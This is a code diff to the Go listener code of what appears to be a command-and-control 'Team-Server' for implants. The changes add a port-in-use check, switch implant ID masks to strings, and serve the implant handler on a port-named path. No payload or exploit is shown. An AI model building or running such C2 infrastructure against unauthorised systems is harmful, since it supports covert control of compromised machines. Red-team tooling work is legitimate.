@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"net/http"
+    "net"
 	"Team-Server/UI"
 )
 
@@ -15,7 +16,6 @@ var httpMutex sync.Mutex
 
 var prevLength = 0
 
-var ImplantMap = make(map[string]int)
 var green = "\033[32m"
 var reset = "\033[0m"
 var red = "\033[31m"
@@ -23,7 +23,7 @@ var operatorPort = "8443"
 
 type CommandQueueItem struct {
     Commands [][]string
-    IDMask   int
+    IDMask   string
 }
 
 var commandQueue []CommandQueueItem
@@ -67,7 +67,6 @@ func OperatorServer() {
 }
 
 func createListener(cmdString string, respChan chan<- string) {
-    // proto + "," + ip + "," +  port
     parts := strings.Split(cmdString, ",")
     if len(parts) != 3 {
         return
@@ -76,6 +75,17 @@ func createListener(cmdString string, respChan chan<- string) {
     listenerProto := parts[0]
     listenerIP := parts[1]
     listenerPort := parts[2]
+
+    // Check if the port is already in use
+    listenerAddr := fmt.Sprintf("%s:%s", listenerIP, listenerPort)
+    listener, err := net.Listen("tcp", listenerAddr)
+    if err != nil {
+        // Port is already in use, print server started and return
+        resp := "Server already started on that IP and port\n"
+        respChan <- resp
+        return
+    }
+    listener.Close()
 
     // Handling different protocols
     switch strings.ToUpper(listenerProto) {
@@ -92,10 +102,16 @@ func createListener(cmdString string, respChan chan<- string) {
     }    
 }
 
+/*
+
+*/
+
 func httpListener(listenerIP string, listenerPort string) string {
     httpMutex.Lock()
     defer httpMutex.Unlock()
-    http.HandleFunc("/implant", handleImplant)
+    endPoint := "/" + listenerPort
+    http.HandleFunc(endPoint, handleImplant)
+
 	// Server configuration
     server := &http.Server{
         Addr:    listenerIP + ":" + listenerPort,
